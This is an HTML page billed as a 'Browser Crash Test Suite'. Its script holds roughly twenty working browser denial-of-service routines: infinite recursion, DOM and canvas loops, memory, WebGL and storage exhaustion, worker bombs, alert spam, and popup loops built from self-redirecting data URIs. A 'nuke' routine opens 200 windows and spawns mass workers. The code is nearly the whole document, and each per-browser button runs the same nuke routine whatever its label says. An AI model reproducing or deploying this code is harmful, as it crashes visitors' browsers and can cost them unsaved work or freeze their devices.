<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Browser Crash Test Suite</title>
  <style>
    :root {
      --bg: #0e0f11;
      --fg: #f3f3f3;
      --accent: #ff5555;
      --card: #1b1d22;
      --border: #2c2f36;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: var(--bg);
      color: var(--fg);
      font-family: 'Segoe UI', Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 1rem;
    }
    .container {
      background: var(--card);
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
      max-width: 700px;
      width: 100%;
      border: 1px solid var(--border);
    }
    h1 { font-size: 1.8rem; margin-bottom: 1rem; color: var(--accent); text-align: center; }
    h2 { margin-top: 2rem; font-size: 1.3rem; color: var(--fg); }
    .warning { color: var(--accent); font-weight: bold; margin: 0.5rem 0 1rem; }
    .quick-buttons { display: flex; flex-wrap: wrap; gap: 0.5rem; justify-content: center; }
    button, select { font-size: 0.95rem; padding: 0.75rem 1.25rem; border-radius: 8px; border: 1px solid var(--border); background: #2a2d34; color: var(--fg); cursor: pointer; transition: background 0.2s, transform 0.1s; }
    button:hover, select:hover { background: #33363d; transform: scale(1.02); }
    button:active { transform: scale(0.98); }
    select { min-width: 260px; margin-right: 0.5rem; }
    .section { text-align: center; }
    .divider { margin: 2rem 0; height: 1px; background: var(--border); }
  </style>
</head>
<body>
  <div class="container">
    <h1>Browser Crash Test Suite</h1>
    <div class="section">
      <h2>Quick Crash</h2>
      <div class="warning">Instantly crash your chosen browser. Use with caution.</div>
      <div class="quick-buttons">
        <button onclick="quickCrash('chrome')">Crash Chrome</button>
        <button onclick="quickCrash('firefox')">Crash Firefox</button>
        <button onclick="quickCrash('edge')">Crash Edge</button>
        <button onclick="quickCrash('safari')">Crash Safari</button>
        <button onclick="quickCrash('opera')">Crash Opera</button>
        <button onclick="crash.nuke()">Nuke Entire Browser</button>
      </div>
    </div>
    <div class="divider"></div>
    <div class="section">
      <h2>Advanced Crash Methods</h2>
      <p>Select from various crash routines below to test individual methods.</p>
      <select id="method">
        <option value="stack">Infinite Recursion</option>
        <option value="dom">DOM Bomb</option>
        <option value="canvas">Canvas Flood</option>
        <option value="gpuFatal">Huge WebGL Buffer</option>
        <option value="blob">Blob URI Spam</option>
        <option value="worker">Web Worker Bomb</option>
        <option value="iframe">Iframe Nesting</option>
        <option value="alloc">Memory Allocation Loop</option>
        <option value="fatalAlloc">ArrayBuffer OOM</option>
        <option value="raf">requestAnimationFrame Lock</option>
        <option value="xhr">XHR Flood</option>
        <option value="wasm">WASM Memory Bomb</option>
        <option value="audio">AudioContext Leak</option>
        <option value="storage">LocalStorage Flood</option>
        <option value="dialog">Alert/Confirm Spam</option>
        <option value="channel">BroadcastChannel Flood</option>
        <option value="shared">SharedArrayBuffer Wait Lock</option>
        <option value="swBomb">ServiceWorker Block</option>
        <option value="sequence">Full Sequence (Sequential)</option>
        <option value="concurrent">All Methods (Simultaneous)</option>
        <option value="nuke">Nuke Entire Browser</option>
      </select>
      <button id="crashBtn">Run Method</button>
    </div>
  </div>

  <script>
    const crash = {
      stack: () => { (function recurse(){ recurse(); })(); },
      dom: () => { while(true) document.body.appendChild(document.createElement('div')); },
      canvas: () => { const c = document.createElement('canvas'); c.width = c.height = 10000; document.body.appendChild(c); const ctx = c.getContext('2d'); while(true) ctx.fillRect(Math.random()*10000, Math.random()*10000, 100, 100); },
      gpuFatal: () => { const c = document.createElement('canvas'); document.body.appendChild(c); const gl = c.getContext('webgl2') || c.getContext('webgl'); const buf = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, buf); gl.bufferData(gl.ARRAY_BUFFER, 1e9, gl.STATIC_DRAW); gl.drawArrays(gl.POINTS, 0, 1e8); },
      blob: () => { const p = 'data:text/html;base64,' + btoa('<script>location="data:text/html;base64,' + btoa('<script>location=location<\/script>') + '"<\/script>'); while(true) window.open(p); },
      worker: () => { const b = new Blob(['onmessage=function(){while(true)Array(1e7).fill("*");}']); const url = URL.createObjectURL(b); for(let i=0;i<100;i++){ const w = new Worker(url); w.postMessage('go'); } },
      iframe: () => { for(let i=0;i<100;i++){ const f = document.createElement('iframe'); f.src = 'about:blank'; document.body.appendChild(f); } },
      alloc: () => { const arrs = []; while(true) arrs.push(new Array(1e7).fill('*')); },
      fatalAlloc: () => { try{ new ArrayBuffer(1e12); } catch(e){} },
      raf: () => { function spin(){ for(let i=0;i<500000;i++) Math.sqrt(Math.random()); requestAnimationFrame(spin); } requestAnimationFrame(spin); },
      xhr: () => { while(true){ try{ const r = new XMLHttpRequest(); r.open('GET','/',false); r.send(); } catch(e){} } },
      wasm: () => { const buf = new WebAssembly.Memory({initial:1024,maximum:1024}); WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,5,3,1,0,1,7,7,1,3,103,101,116,0,0,10,9,1,7,0,65,0,11]),{env:{memory:buf}}).then(m=>{ while(true) buf.grow(20); }); },
      audio: () => { function leak(){ new AudioContext(); leak(); } leak(); },
      storage: () => { while(true) localStorage.setItem('crash', new Array(1e7).join('*')); },
      dialog: () => { while(true){ alert('Crash'); confirm('Crash'); } },
      channel: () => { const bc = new BroadcastChannel('c'); bc.onmessage = ()=>{}; while(true) bc.postMessage('x'); },
      shared: () => { const sab = new SharedArrayBuffer(4); const ia = new Int32Array(sab); while(true) Atomics.wait(ia, 0, 0, 500); },
      swBomb: () => { if(navigator.serviceWorker){ for(let i=0;i<200;i++) navigator.serviceWorker.register('data:text/javascript,while(true){}'); } },
      sequence: () => { for(const m in crash){ if(m!=='sequence'&&m!=='concurrent'&&m!=='nuke') crash[m](); } },
      concurrent: () => { for(const m in crash){ if(m!=='sequence'&&m!=='concurrent'&&m!=='nuke') setTimeout(crash[m],0); } },
      nuke: () => {
        // spawn windows
        const wins = [];
        for(let i=0;i<200;i++){ try{ wins.push(window.open(location.href)); } catch{} }
        // spawn workers
        for(let i=0;i<200;i++){ crash.worker(); }
        // allocate memory
        try{ crash.alloc(); } catch{};
        // WebGL OOM
        try{ crash.gpuFatal(); } catch{};
        // ArrayBuffer OOM
        try{ crash.fatalAlloc(); } catch{};
        // service workers
        try{ crash.swBomb(); } catch{};
        // audio
        try{ crash.audio(); } catch{};
        // storage
        try{ crash.storage(); } catch{};
        // XHR
        try{ crash.xhr(); } catch{};
        // Close windows
        setTimeout(()=> wins.forEach(w=>w&&w.close()),100);
      }
    };

    function quickCrash(browser){ setTimeout(()=>{ switch(browser){ case 'safari': crash.nuke(); break; default: crash.nuke(); } },100); }

    document.getElementById('crashBtn').addEventListener('click',()=>{ const m=document.getElementById('method').value; setTimeout(()=>crash[m](),50); });
  </script>
</body>
</html>
